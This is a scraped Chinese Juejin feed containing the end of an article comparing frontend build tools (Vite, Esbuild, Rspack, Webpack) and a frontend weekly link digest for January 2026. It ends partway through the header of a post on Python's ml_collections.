<p>Vite 将“构建”这个动作，从 服务器端 (Build Time) 转移到了 浏览器端 (Runtime)，并将全量计算拆解成了按需计算。</p>
<p>无论你的项目有 100 个页面还是 1000 个页面，Vite 启动时只处理入口文件。启动速度与项目规模解耦，时间复杂度变成了 O(1)。</p>
<h3 data-id="heading-2">1.2 生产环境的妥协：Bundle 依然必要</h3>
<p>很多新手误以为 Vite 在生产环境也是 Bundless（无打包）的。<strong>这是错的。</strong></p>
<p>虽然 HTTP/2 支持多路复用，理论上可以并发请求几百个文件，但在物理现实中，网络瀑布流 (Network Waterfall) 依然是性能杀手。</p>
<p>如果 A.js 依赖 B.js，B.js 依赖 C.js，浏览器必须串行下载。在移动端弱网环境下，这种 RTT（往返时延）是不可接受的。</p>
<p>因此，Vite 在生产环境依然调用 Rollup 进行打包。</p>
<p>这就引入了一个架构上的 一致性风险：开发环境（Esbuild + 原生 ESM）与生产环境（Rollup Bundle）不仅运行机制不同，甚至部分 AST 解析逻辑也不一致。这是 Vite 架构中最大的 Trade-off。</p>
<hr/>
<h2 data-id="heading-3">二、 算力的暴力美学：Rust 与 Go 的底层重写</h2>
<p>架构优化总有尽头，当 JS 引擎跑得冒烟也追不上项目膨胀的速度时，基础架构师们决定更换底层的“发动机”。</p>
<h3 data-id="heading-4">2.1 Esbuild：Go 语言的闪电战</h3>
<p>Esbuild 是第一个打破僵局的英雄。它用 Go 语言编写，主打“快到离谱”。</p>
<p>它比 Webpack 快 10-100 倍。为什么？</p>
<ol>
<li><strong>编译型语言 vs 解释型语言：</strong> Go 编译成机器码，没有 JS 的 JIT 开销。</li>
<li><strong>极致并行 (Parallelism)：</strong> Webpack 运行在 Node.js 主线程（虽然有 worker-thread 但开销大），而 Esbuild 利用 Go 的 Goroutine 榨干了 CPU 的每一个核心。</li>
<li><strong>零内存拷贝：</strong> 从解析到打印，尽量复用数据结构，减少内存占用。</li>
</ol>
<p>Vite 的预构建（Pre-bundling）就是基于 Esbuild 实现的，把成吨的 <code>node_modules</code> 依赖瞬间转换成 ESM。</p>
<h3 data-id="heading-5">2.2 SWC 与 Turbopack：Vercel 的野望</h3>
<p>SWC (Speedy Web Compiler) 是用 Rust 写的，它的目标是替代 Babel。</p>
<p>而 Turbopack（由 Webpack 之父 Tobias 创建，Vercel 赞助）则是基于 Rust 的“Webpack 接班人”。它引入了 增量计算 (Incremental Computation) 的概念——永远只计算变动的部分，且在函数级别进行缓存。</p>
<p>虽然 Turbopack 声称比 Vite 快 10 倍，但在生态兼容性上目前仍处于追赶状态。</p>
<hr/>
<h2 data-id="heading-6">三、 终极缝合怪：Rspack 的兼容之道</h2>
<p>架构选型往往不是选“最先进的”，而是选“最合适的”。</p>
<p>Vite 虽然好，但对于那些拥有几百个自定义 Webpack Loader/Plugin 的巨型老项目来说，迁移成本等于重写。</p>
<p>这时候，字节跳动开源的 Rspack 走了一条极其务实（也极其困难）的路：</p>
<p>用 Rust 重写 Webpack。</p>
<h3 data-id="heading-7">3.1 "Webpack Interface, Rust Kernel"</h3>
<p>Rspack 的架构策略非常狡猾：</p>
<ul>
<li><strong>外壳：</strong> 几乎 100% 模拟 Webpack 的配置 API、Loader 机制和 Plugin 系统。</li>
<li><strong>内核：</strong> 底层全部用 Rust 实现并行编译、Tree Shaking 和压缩。</li>
</ul>
<p>这意味着，你可能只需要把 <code>webpack.config.js</code> 改名为 <code>rspack.config.js</code>，安装几个包，就能获得 10 倍的构建性能提升。</p>
<p>架构视角：</p>
<p>Rspack 解决的是 “存量市场” 的痛点。它牺牲了部分架构的纯洁性（背负了 Webpack 的配置包袱），换取了巨大的生态兼容性。这在架构演进中被称为 Strangler Fig Pattern（绞杀榕模式） 的变体——在旧接口下替换新实现。</p>
<hr/>
<h2 data-id="heading-8">四、 架构师的决策矩阵：2026 年选什么？</h2>
<p>站在今天，面对 Webpack、Vite、Rspack，架构师该如何抉择？</p>









































<table><thead><tr><th><strong>维度</strong></th><th><strong>Vite</strong></th><th><strong>Rspack</strong></th><th><strong>Webpack 5</strong></th></tr></thead><tbody><tr><td><strong>核心场景</strong></td><td>中小型项目、新项目、单页应用 (SPA)</td><td>巨型 Monorepo、存量项目迁移、对构建速度极度敏感</td><td>及其特殊的定制化需求、老旧生态捆绑</td></tr><tr><td><strong>开发体验 (DX)</strong></td><td>🌟🌟🌟🌟🌟 (秒开)</td><td>🌟🌟🌟🌟 (极快)</td><td>🌟🌟 (慢)</td></tr><tr><td><strong>生产性能 (UX)</strong></td><td>🌟🌟🌟 (依赖 Rollup)</td><td>🌟🌟🌟🌟🌟 (内置 Rust 优化)</td><td>🌟🌟🌟</td></tr><tr><td><strong>生态兼容</strong></td><td>Rollup 生态优先</td><td>Webpack 生态优先</td><td>原生 Webpack</td></tr><tr><td><strong>底层语言</strong></td><td>JS (部分 Esbuild-Go)</td><td>Rust</td><td>JS</td></tr></tbody></table>
<h3 data-id="heading-9">最佳实践建议：</h3>
<ol>
<li><strong>Greenfield (新项目)：</strong> 闭眼选 <strong>Vite</strong>。社区最活跃，插件生态最好，DX 最佳。</li>
<li><strong>Brownfield (老旧大仓)：</strong> 尝试迁移到 <strong>Rspack</strong>。不要试图把一个配置了 5 年的 Webpack 项目硬迁到 Vite，你会死在 Loader 的兼容性上。Rspack 是这类项目的救星。</li>
<li><strong>Library (库开发)：</strong> 依然推荐 <strong>Rollup</strong> 或基于 Rollup 的构建流。Vite 的库模式本质也是 Rollup。</li>
</ol>
<hr/>
<h2 data-id="heading-10">结语：工具链的终局</h2>
<p>从 Webpack 的大包大揽，到 Vite 的按需加载，再到 Rspack 的 Rust 重构。前端构建工具的发展史，其实就是一部 <strong>“对抗熵增与压榨硬件性能”</strong> 的历史。</p>
<p>未来的构建工具将不再是单纯的 JavaScript 脚本，而是一套 <strong>基于 Rust/Go 的高性能二进制工具链</strong>。前端工程师的门槛，正在从“配置工程师”转变为“理解编译原理与系统架构”的工程师。</p>
<blockquote>
<p>Next Step:</p>
<p>引擎已经准备就绪，&lt;模块化&gt; 和 &lt;包管理&gt; 也已齐备。但如何让成百上千的开发人员在这条高速公路上不发生车祸？我们需要一套强有力的交通规则。</p>
<p>下一节，我们将进入**《第五篇：规范——把标准装进盒子里：企业级脚手架的设计与落地》**，聊聊 如何通过脚手架强制执行架构意志。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[⏰前端周刊第 449 期（2026年1月11日-1月17日）]]></title>    <link>https://juejin.cn/post/7597083949833109510</link>    <guid>https://juejin.cn/post/7597083949833109510</guid>    <pubDate>2026-01-20T03:36:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597083949833109510" data-draft-id="7597076280983011391" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="⏰前端周刊第 449 期（2026年1月11日-1月17日）"/> <meta itemprop="keywords" content="前端,前端框架,GitHub"/> <meta itemprop="datePublished" content="2026-01-20T03:36:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金安东尼"/> <meta itemprop="url" content="https://juejin.cn/user/1521379823340792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ⏰前端周刊第 449 期（2026年1月11日-1月17日）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379823340792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金安东尼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:36:52.000Z" title="Tue Jan 20 2026 03:36:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>📢 <strong>宣言</strong>：<strong>每周更新国外论坛的前端热门文章，推荐大家阅读/翻译，紧跟时事，掌握前端技术动态，也为写作或突破新领域提供灵感~</strong></p>
<p>欢迎大家访问：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN%2Ffrontend-weekly-digest-cn" target="_blank" title="https://github.com/TUARAN/frontend-weekly-digest-cn" ref="nofollow noopener noreferrer">github.com/TUARAN/fron…</a>
顺手点个 ⭐ star 支持，是我们持续输出的续航电池🔋✨！</p>
<p>在线网址：<a href="https://link.juejin.cn?target=https%3A%2F%2Ffrontendweekly.cn%2F" target="_blank" title="https://frontendweekly.cn/" ref="nofollow noopener noreferrer">frontendweekly.cn/</a></p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9783d1212095437399e6156790a8d2bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769485011&amp;x-signature=zQphtWacAJmDIRcAbkcUxv%2F7SJk%3D" alt="前端周刊封面" loading="lazy"/></p>
<hr/>
<p>💬 <strong>推荐语</strong></p>
<p>本期聚焦"年度盘点与工程实践的双轨路线"。Web 开发部分从 HTTP Archive 的 Web 年度状况报告、Astro 加入 Cloudflare 的战略背景出发，延伸到前端工程权衡决策、AI-ready 架构设计与 GSAP 滚动动画的实现路径；同时覆盖测试工程实践、Web Components 的连接模式与全新的 HTML <code>&lt;geolocation&gt;</code> 元素提案，以及 Node.js 针对 React/Next.js 的 DoS 缓解措施。CSS 部分带来非规则形状的阴影处理、Safari 网格调试工具升级、100vw 滚动条感知的兼容性改进与 StyleX 对比 Tailwind 的工程可维护性讨论。JavaScript 领域涵盖引擎生态全景（JavaScript engines zoo）、反"数组化"的性能优化思路与 Nuxt 4 性能指南；React 分栏则包括组件逆向窃取漏洞、useEffectEvent 闭包解决方案、性能测量优化、Vercel 最佳实践，以及 TanStack AI 与 Vercel AI SDK 的技术选型对比。</p>
<hr/>
<h2 data-id="heading-0">🗂 本期精选目录</h2>
<h3 data-id="heading-1">🧭 Web 开发</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Falmanac.httparchive.org%2Fen%2F2025%2F" target="_blank" title="https://almanac.httparchive.org/en/2025/" ref="nofollow noopener noreferrer">Web Almanac 2025 — HTTP Archive's annual state of the web report</a>：HTTP Archive 的年度 Web 状况报告，从性能、可访问性到新标准采用率全方位盘点 2025 年 Web 平台发展。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cloudflare.com%2Fastro-joins-cloudflare%2F" target="_blank" title="https://blog.cloudflare.com/astro-joins-cloudflare/" ref="nofollow noopener noreferrer">Astro is joining Cloudflare</a>：Astro 宣布加入 Cloudflare，围绕边缘计算与现代部署体验的战略合作背景解读。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fmastering-frontend-tradeoffs-the-2026-guide-for-senior-devs%2F" target="_blank" title="https://thenewstack.io/mastering-frontend-tradeoffs-the-2026-guide-for-senior-devs/" ref="nofollow noopener noreferrer">Mastering Frontend Tradeoffs: The 2026 Guide for Senior Devs</a>：面向高级开发者的前端工程权衡指南：从技术选型、性能、可维护性到团队协作的系统化决策框架。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Feslint.org%2Fblog%2F2026%2F01%2Feslint-2025-year-review%2F" target="_blank" title="https://eslint.org/blog/2026/01/eslint-2025-year-review/" ref="nofollow noopener noreferrer">ESLint's 2025 year in review</a>：ESLint 2025 年度回顾：核心功能改进、生态演进与社区贡献总结。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Fai-ready-frontend-architecture-guide%2F" target="_blank" title="https://blog.logrocket.com/ai-ready-frontend-architecture-guide/" ref="nofollow noopener noreferrer">A developer's guide to designing AI-ready frontend architecture</a>：构建"AI-ready"前端架构的指南：从数据流、状态管理到交互模式如何适配 AI 能力的集成需求。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2Fcodrops%2F2026%2F01%2F15%2Fbuilding-a-scroll-driven-dual-wave-text-animation-with-gsap%2F" target="_blank" title="https://tympanus.net/codrops/2026/01/15/building-a-scroll-driven-dual-wave-text-animation-with-gsap/" ref="nofollow noopener noreferrer">Building a Scroll-Driven Dual-Wave Text Animation with GSAP</a>：用 GSAP 实现滚动驱动的双波浪文字动画，详解时间轴同步与性能优化技巧。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhowtotestfrontend.com%2Fresources%2Fhow-to-write-good-frontend-tests" target="_blank" title="https://howtotestfrontend.com/resources/how-to-write-good-frontend-tests" ref="nofollow noopener noreferrer">How to write good frontend tests: 37 tips and tricks</a>：前端测试的 37 个技巧清单：从测试结构、覆盖率到可维护性的最佳实践合集。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fblog%2Fvulnerability%2Fjanuary-2026-dos-mitigation-async-hooks" target="_blank" title="https://nodejs.org/en/blog/vulnerability/january-2026-dos-mitigation-async-hooks" ref="nofollow noopener noreferrer">Mitigating Denial-of-Service Vulnerability from Unrecoverable Stack Space Exhaustion for React, Next.js, and APM Users</a>：Node.js 针对 React、Next.js 与 APM 用户的 DoS 漏洞缓解指南：分析栈空间耗尽攻击的成因与防护措施。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmedium.com%2Fpreply-engineering%2Ffront-end-testing-at-preply-shifting-left-towards-component-testing-3e83c8608235" target="_blank" title="https://medium.com/preply-engineering/front-end-testing-at-preply-shifting-left-towards-component-testing-3e83c8608235" ref="nofollow noopener noreferrer">Front-end testing at Preply: shifting left towards component testing</a>：Preply 的前端测试演进：从端到端测试向组件测试"左移"的实践经验与工程收益。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffrontendmasters.com%2Fblog%2Fthe-missing-link-for-web-components%2F" target="_blank" title="https://frontendmasters.com/blog/the-missing-link-for-web-components/" ref="nofollow noopener noreferrer">The Missing Link for Web Components</a>：讨论 Web Components 生态中"缺失的连接"：从框架互操作、生态工具到开发体验的改进方向。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.chrome.com%2Fblog%2Fgeolocation-html-element" target="_blank" title="https://developer.chrome.com/blog/geolocation-html-element" ref="nofollow noopener noreferrer">Introducing the <code>&lt;geolocation&gt;</code> HTML element</a>：Chrome 推出全新 <code>&lt;geolocation&gt;</code> HTML 元素提案，以声明式方式处理位置信息获取与权限管理。</li>
</ul>
<h4 data-id="heading-2">♿ 无障碍访问</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpiccalil.li%2Fblog%2Faccessible-faux-nested-interactive-controls%2F" target="_blank" title="https://piccalil.li/blog/accessible-faux-nested-interactive-controls/" ref="nofollow noopener noreferrer">Accessible faux-nested interactive controls</a>：如何以无障碍友好的方式实现"伪嵌套"交互控件（如卡片内按钮），避免语义与键盘导航冲突。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fadrianroselli.com%2F2026%2F01%2Flive-region-support.html" target="_blank" title="https://adrianroselli.com/2026/01/live-region-support.html" ref="nofollow noopener noreferrer">Live Region Support</a>：深入 ARIA Live Region 的跨浏览器与辅助技术支持现状，梳理使用时需注意的兼容性细节。</li>
</ul>
<h3 data-id="heading-3">🎨 CSS</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wearedevelopers.com%2Fen%2Fmagazine%2F675%2Fadding-shadows-to-irregular-shapes-in-css-with-filter-drop-shadow-675" target="_blank" title="https://www.wearedevelopers.com/en/magazine/675/adding-shadows-to-irregular-shapes-in-css-with-filter-drop-shadow-675" ref="nofollow noopener noreferrer">Adding shadows to irregular shapes in CSS with filter: drop-shadow()</a>：用 <code>filter: drop-shadow()</code> 为非规则形状添加阴影，对比 <code>box-shadow</code> 的限制与应用场景差异。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebkit.org%2Fblog%2F17746%2Fnew-safari-developer-tools-provide-insight-into-css-grid-lanes%2F" target="_blank" title="https://webkit.org/blog/17746/new-safari-developer-tools-provide-insight-into-css-grid-lanes/" ref="nofollow noopener noreferrer">New Safari developer tools provide insight into CSS Grid Lanes</a>：Safari 新增的 Grid Lanes 调试工具，帮助开发者可视化网格轨道与布局结构。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bram.us%2F2026%2F01%2F15%2F100vw-horizontal-overflow-no-more%2F" target="_blank" title="https://www.bram.us/2026/01/15/100vw-horizontal-overflow-no-more/" ref="nofollow noopener noreferrer">Using 100vw is now scrollbar-aware (in Chrome 145+, under the right conditions)</a>：Chrome 145+ 让 <code>100vw</code> 在特定条件下感知滚动条宽度，避免横向溢出的布局问题。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffrontendmasters.com%2Fblog%2Fsimulating-crop-marks%2F" target="_blank" title="https://frontendmasters.com/blog/simulating-crop-marks/" ref="nofollow noopener noreferrer">Simulating Crop Marks</a>：用纯 CSS 模拟印刷裁切标记（crop marks），为设计预览与打印适配提供样式方案。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdbushell.com%2F2026%2F01%2F09%2Fdeath-to-scroll-fade%2F" target="_blank" title="https://dbushell.com/2026/01/09/death-to-scroll-fade/" ref="nofollow noopener noreferrer">Death to Scroll Fade!</a>：批判"滚动渐隐"交互模式的可用性问题，并探讨更好的内容截断与加载提示方案。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fstylex-vs-tailwind-metas-take-on-css-in-js-maintainability%2F" target="_blank" title="https://thenewstack.io/stylex-vs-tailwind-metas-take-on-css-in-js-maintainability/" ref="nofollow noopener noreferrer">StyleX vs. Tailwind: Meta's Take on CSS-in-JS Maintainability</a>：对比 Meta 的 StyleX 与 Tailwind 在 CSS-in-JS 可维护性、性能与团队协作方面的工程取舍。</li>
</ul>
<h3 data-id="heading-4">💡 JavaScript</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzoo.js.org%2F" target="_blank" title="https://zoo.js.org/" ref="nofollow noopener noreferrer">JavaScript engines zoo</a>：JavaScript 引擎动物园——可视化展示 V8、SpiderMonkey、JavaScriptCore 等主流引擎的架构、优化策略与基准性能对比。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fallthingssmitty.com%2F2026%2F01%2F12%2Fstop-turning-everything-into-arrays-and-do-less-work-instead%2F" target="_blank" title="https://allthingssmitty.com/2026/01/12/stop-turning-everything-into-arrays-and-do-less-work-instead/" ref="nofollow noopener noreferrer">Stop turning everything into arrays (and do less work instead)</a>：避免过度"数组化"的性能陷阱：用迭代器、生成器等惰性求值方式减少无谓计算与内存开销。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmasteringnuxt.com%2Fblog%2Fnuxt-4-performance-optimization-complete-guide-to-faster-apps-in-2026%3Ffriend%3DMOKKAPPS" target="_blank" title="https://masteringnuxt.com/blog/nuxt-4-performance-optimization-complete-guide-to-faster-apps-in-2026?friend=MOKKAPPS" ref="nofollow noopener noreferrer">Nuxt 4 Performance Optimization: Complete Guide to Faster Apps in 2026</a>：Nuxt 4 性能优化完整指南：覆盖代码分割、预渲染、缓存策略与边缘部署的实战路径。</li>
</ul>
<h4 data-id="heading-5">⚛️ React</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffant.io%2Freact%2F" target="_blank" title="https://fant.io/react/" ref="nofollow noopener noreferrer">How to Steal Any React Component</a>：展示 React 组件如何被逆向"窃取"的漏洞与安全隐患，提醒开发者在打包与部署时注意代码混淆与鉴权保护。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpeterkellner.net%2F2026%2F01%2F09%2Funderstanding-react-useeffectevent-vs-useeffect%2F" target="_blank" title="https://peterkellner.net/2026/01/09/understanding-react-useeffectevent-vs-useeffect/" ref="nofollow noopener noreferrer">Understanding React's useEffectEvent: A Complete Guide to Solving Stale Closures</a>：深入 <code>useEffectEvent</code> 如何解决闭包陈旧问题：与 <code>useEffect</code> 的对比、使用场景与最佳实践。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.debugbear.com%2Fblog%2Fmeasuring-react-app-performance" target="_blank" title="https://www.debugbear.com/blog/measuring-react-app-performance" ref="nofollow noopener noreferrer">How to Measure and Optimize React Performance</a>：React 性能度量与优化系统方法论：从 Profiler API、React DevTools 到真实用户监控的工程链条。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvercel.com%2Fblog%2Fintroducing-react-best-practices" target="_blank" title="https://vercel.com/blog/introducing-react-best-practices" ref="nofollow noopener noreferrer">Introducing: React Best Practices by Vercel</a>：Vercel 发布 React 最佳实践指南：涵盖 RSC、数据获取、路由与部署的官方推荐模式。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.columkelly.com%2Fblog%2Fuse-optimistic" target="_blank" title="https://www.columkelly.com/blog/use-optimistic" ref="nofollow noopener noreferrer">useOptimistic Won't Save You</a>：讨论 <code>useOptimistic</code> 的局限性与适用边界，避免过度依赖乐观更新导致状态不一致。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Freact-router-v7-guide%2F" target="_blank" title="https://blog.logrocket.com/react-router-v7-guide/" ref="nofollow noopener noreferrer">How to use React Router v7 in React apps</a>：React Router v7 使用指南：新特性、路由配置与从旧版本迁移的注意事项。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Ftanstack-vs-vercel-ai-library-react%2F" target="_blank" title="https://blog.logrocket.com/tanstack-vs-vercel-ai-library-react/" ref="nofollow noopener noreferrer">TanStack AI vs. Vercel AI SDK: Choosing the right AI library for React</a>：对比 TanStack AI 与 Vercel AI SDK 在 React 项目中的 API 设计、集成难度与生态支持，帮助技术选型。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fthe-react-framework-face-off-which-one-owns-the-future%2F" target="_blank" title="https://thenewstack.io/the-react-framework-face-off-which-one-owns-the-future/" ref="nofollow noopener noreferrer">The React Framework Face-Off: Which One Owns the Future?</a>：Next.js、Remix、Astro、Gatsby 等 React 框架大比拼：从渲染模式、生态健康到趋势预判给出全景对比。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你还没受够python原生字典的写法吗？用ml_collections试试吧]]></title>    <link>https://juejin.cn/post/7596975035438694409</link>    <guid>https://juejin.cn/post/7596975035438694409</guid>    <pubDate>2026-01-20T03:55:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035438694409" data-draft-id="7596983314806358066" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你还没受够python原生字典的写法吗？用ml_collections试试吧"/> <meta itemprop="keywords" content="Python,机器学习,深度学习"/> <meta itemprop="datePublished" content="2026-01-20T03:55:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="茫茫此生何所求"/> <meta itemprop="url" content="https://juejin.cn/user/465848663552974"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" 